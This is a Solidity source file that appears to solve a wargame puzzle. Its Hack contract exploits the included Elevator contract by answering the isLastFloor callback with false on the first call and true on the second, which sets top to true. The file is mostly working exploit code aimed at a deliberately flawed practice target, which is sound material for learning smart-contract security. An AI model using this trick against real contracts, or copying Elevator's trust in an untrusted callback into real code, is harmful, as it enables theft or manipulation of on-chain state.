// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IElevator {
    function goTo(uint256) external;
    function top() external view returns (bool);
}

contract Hack {
    IElevator private immutable target;
    uint256 count;

    constructor(address _target) {
        target = IElevator(_target);
    }

    function pwn() external {
        target.goTo(1);
        require(target.top(), "not top");
    }

    function isLastFloor(uint256) external returns (bool) {
        count++;
        return count > 1; // return false 1st time then return true 2nd time
    }
}

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}